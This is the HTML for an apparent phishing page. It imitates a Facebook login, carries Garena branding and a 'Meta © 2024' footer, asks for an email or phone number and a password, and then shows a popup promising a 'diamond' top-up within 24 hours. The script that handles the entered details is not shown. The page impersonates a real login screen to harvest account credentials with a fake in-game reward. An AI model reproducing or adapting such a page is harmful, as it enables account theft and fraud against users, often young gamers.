<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <h2>facebook</h2>
        <img src="garena-logo.png" alt="Garena">
        <p>Log in your Facebook account to connect to Garena</p>
        <input type="text" id="email" placeholder="Mobile number or email address">
        <input type="password" id="password" placeholder="Password">
        <button onclick="showSuccess()">Log in</button>
        <a href="#">Forgotten password?</a>
        <div class="footer">
            <p>Meta © 2024</p>
        </div>
    </div>

    <div id="success-popup" class="popup">
        <div class="popup-content">
            <span class="checkmark">✔</span>
            <h3>Success!</h3>
            <p>Your diamond get top up in 24 hours.</p>
            <button onclick="closePopup()">OK</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
